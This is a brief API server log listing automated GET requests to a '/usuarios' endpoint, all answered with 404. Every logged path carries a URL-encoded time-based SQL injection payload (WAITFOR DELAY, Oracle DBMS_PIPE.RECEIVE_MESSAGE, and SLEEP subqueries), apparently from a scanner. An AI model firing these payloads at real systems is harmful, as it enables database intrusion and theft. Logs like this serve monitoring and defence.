api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:60362 - "GET /usuarios%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60366 - "GET /usuarios%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60376 - "GET /usuarios%27%29%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60372 - "GET /usuarios%27%3BWAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60392 - "GET /usuarios%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28122%29%7C%7CCHR%2887%29%7C%7CCHR%2872%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:60400 - "GET /usuarios%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28122%29%7C%7CCHR%2887%29%7C%7CCHR%2872%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45730 - "GET /usuarios%27%29%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28122%29%7C%7CCHR%2887%29%7C%7CCHR%2872%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45746 - "GET /usuarios%27%3BSELECT/%2A%2A/DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28122%29%7C%7CCHR%2887%29%7C%7CCHR%2872%29%2C5%29/%2A%2A/FROM/%2A%2A/DUAL-- HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45758 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/1610/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29EXST%29/%2A%2A/AND/%2A%2A/%289020%3D9020 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:45770 - "GET /usuarios/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/1610/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29EXST%29 HTTP/1.1" 404 Not Found
